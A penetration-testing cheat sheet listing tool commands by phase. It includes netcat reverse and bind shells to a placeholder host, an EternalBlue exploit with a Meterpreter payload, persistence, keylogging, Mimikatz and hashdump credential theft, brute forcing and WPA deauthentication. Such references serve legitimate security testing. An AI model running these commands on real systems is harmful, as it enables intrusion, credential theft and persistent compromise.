# Penetration Testing Tools Quick Reference

A command reference guide for commonly used penetration testing tools organized by phase.

## Phase 1: Reconnaissance

### Nmap (Network Scanning)

```bash
# Basic TCP scan
nmap -sT target.com

# SYN scan (requires sudo)
sudo nmap -sS target.com

# Version detection
nmap -sV target.com

# Aggressive scan (OS, version, script, traceroute)
nmap -A target.com

# Full port scan
nmap -p- target.com

# UDP scan
nmap -sU target.com

# Scan specific ports
nmap -p 22,80,443 target.com

# Output all formats
nmap -oA output target.com

# Timing (T1-T5, faster to slower)
nmap -T4 target.com

# Script scan
nmap --script vuln target.com
```

### Subdomain Enumeration

```bash
# Amass
amass enum -passive -d example.com
amass enum -active -d example.com

# Sublist3r
sublist3r -d example.com
sublist3r -d example.com -o subdomains.txt

# AssetFinder
assetfinder example.com

# Findomain
findomain -t example.com

# Recon-ng
recon-ng
```

### theHarvester (Email Gathering)

```bash
theHarvester -d example.com -b all
theHarvester -d example.com -b google
theHarvester -d example.com -b linkedin
```

### WHOIS

```bash
whois example.com
whois 192.0.2.1
```

### DNS Enumeration

```bash
#dig
dig example.com A
dig example.com MX
dig example.com TXT
dig example.com NS
dig axfr example.com @ns1.example.com

#nslookup
nslookup example.com
nslookup -type=any example.com

#dnsenum
dnsenum example.com
dnsenum -f /usr/share/wordlists/dns.txt example.com

#fierce
fierce --domain example.com
```

---

## Phase 2: Web Application Testing

### Burp Suite Commands

```bash
# Start Burp Suite
burpsuite

# Community features (limited)
# Professional recommended for full capability
```

### SQLMap (SQL Injection)

```bash
# Basic injection test
sqlmap -u "http://example.com/page?id=1"

# POST request
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://example.com/page?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# Random user agent
sqlmap -u "http://example.com/page?id=1" --random-agent

# Level/Risk
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
```

### OWASP ZAP

```bash
# Command line scanning
zap-cli quick-scan http://example.com
zap-cli status
zap-cli report -o report.html
```

### Nikto (Web Server Scanning)

```bash
nikto -h http://example.com
nikto -h http://example.com -p 80,443
nikto -h http://example.com -o scan.txt
nikto -h http://example.com -Tuning 1,2,3
```

### Dirb / Gobuster (Directory Brute Force)

```bash
# Dirb
dirb http://example.com
dirb http://example.com /usr/share/wordlists/dirb/common.txt

# Gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html

# FFUF
ffuf -w /usr/share/wordlists/rockyou.txt -u http://example.com/FUZZ
```

---

## Phase 3: Exploitation

### Metasploit Framework

```bash
# Start msfconsole
msfconsole

# Search for exploits
search type:exploit name:smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.0.2.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444

# Execute
exploit

# Meterpreter commands
sysinfo
getuid
shell
hashdump
upload /path/to/file
download /path/to/file
```

### Netcat

```bash
# Simple port scan
nc -zv 192.0.2.1 1-1000

# Banner grab
nc 192.0.2.1 80

# Reverse shell (listener)
nc -lvp 4444

# Reverse shell (target)
nc -e /bin/bash 10.0.0.1 4444

# Bind shell
nc -lvp 4444 -e /bin/bash

# Transfer files
nc -lvp 4444 < file.txt    # Receiver
nc 10.0.0.1 4444 > file.txt  # Sender
```

### Hydra (Password Cracking)

```bash
# SSH brute force
hydra -l admin -P password.txt ssh://192.0.2.1

# HTTP form
hydra -l admin -P password.txt 192.0.2.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP
hydra -l admin -P password.txt ftp://192.0.2.1

# Parallel attacks
hydra -l admin -P password.txt -t 4 ssh://192.0.2.1
```

### John the Ripper

```bash
# Basic password crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Format specific
john --format=md5 hash.txt
john --format=sha512 hash.txt

# Incremental mode
john --incremental hashes.txt
```

---

## Phase 4: Post-Exploitation

### Meterpreter Commands

```bash
# System info
sysinfo
getuid
ipconfig / ifconfig

# Process manipulation
ps
migrate <pid>
kill <pid>

# File operations
ls
cd /path
upload file.txt
download file.txt

# Privilege escalation
getsystem

# Persistence
run persistence -A -L c:\\ -X -i 10 -p 4444 -r 10.0.0.1

# Hash dumping
hashdump
mimikatz
load kiwi

# Network exploration
arp
netstat
route
 portfwd add -l 3389 -p 3389 -r 192.168.1.100 -h 3389

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop
```

### PowerShell Empire

```powershell
# Start Empire
powershell-empire server

# Start listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners) > set Name test
(Empire: listeners) > execute

# Generate agent
(Empire: listeners) > agents
(Empire: agents) > usestager multi/launcher
(Empire: agents) > set Listener test
(Empire: agents) > execute
```

### Mimikatz

```bash
# In Meterpreter
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"

# Standalone
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
```

### BloodHound (Active Directory)

```bash
# Data collection (run as administrator)
.\SharpHound.exe -c All

# Start BloodHound
bloodhound

# Import data
# Drag the .zip file into BloodHound

# Queries
# Shortest path to Domain Admin
# Users with Admin rights
# Computers with unconstrained delegation
```

---

## Phase 5: Wireless Testing

### Aircrack-ng Suite

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -w capture -c 6 --bssid XX:XX:XX:XX:XX:XX wlan0mon

# Deauth attack (force handshake)
aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## Phase 6: Reporting & Documentation

### Faraday (Collaborative Pentest)

```bash
# Start Faraday
faraday
```

### Dradis Framework

```bash
# Start Dradis
cd /opt/dradis
bundle exec rails server
```

---

## Common One-Liners

### Linux

```bash
# Local enumeration
uname -a
cat /etc/passwd
cat /etc/shadow
whoami
id
sudo -l
find / -perm -4000 2>/dev/null
netstat -tulpn
ps aux
df -h
mount
```

### Windows (CMD)

```cmd
# Local enumeration
systeminfo
whoami /all
net user
net localgroup
netstat -ano
ipconfig /all
arp -a
route print
```

### Windows (PowerShell)

```powershell
# Enumeration
Get-Process
Get-Service
Get-LocalUser
Get-LocalGroup
Get-NetTCPConnection
Get-NetUDPEndpoint
Get-ChildItem -Recurse -Filter *.xml
```

---

## Tool Installation Notes

```bash
# Kali Linux (pre-installed)
# Most tools available by default

# Parrot Security OS (pre-installed)
# Similar toolset to Kali

# BlackArch
# pacman -S nmap metasploit

# Manual installation
git clone https://github.com/tool/name
```
